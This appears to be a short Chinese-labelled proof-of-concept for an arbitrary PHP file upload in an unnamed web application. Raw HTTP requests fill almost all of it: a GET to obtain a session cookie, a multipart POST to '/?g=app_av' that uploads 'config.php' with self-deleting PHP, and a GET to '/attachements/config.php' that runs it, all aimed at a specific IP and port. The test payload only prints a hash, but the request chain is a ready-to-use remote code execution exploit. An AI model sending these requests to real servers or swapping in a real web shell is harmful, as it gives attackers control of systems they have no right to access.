```yaml
GET / HTTP/1.1
Host: 222.243.105.3:12386
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive


```

获取cookie

```yaml
POST /?g=app_av HTTP/1.1
Host: 222.243.105.3:12386
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
Cookie: __s_sessionid__=ngdh0k38gbshi14tq1b3kkup53
Accept: */*
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 442

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile";filename="config.php" 
Content-Type: text/plain

<?php echo(md5(233));unlink(__FILE__);?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

app_av_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="certfile_r"

file
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```



上传文件



```
GET /attachements/config.php HTTP/1.1
Host: 222.243.105.3:12386
Cookie: __s_sessionid__=ngdh0k38gbshi14tq1b3kkup53
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive


```

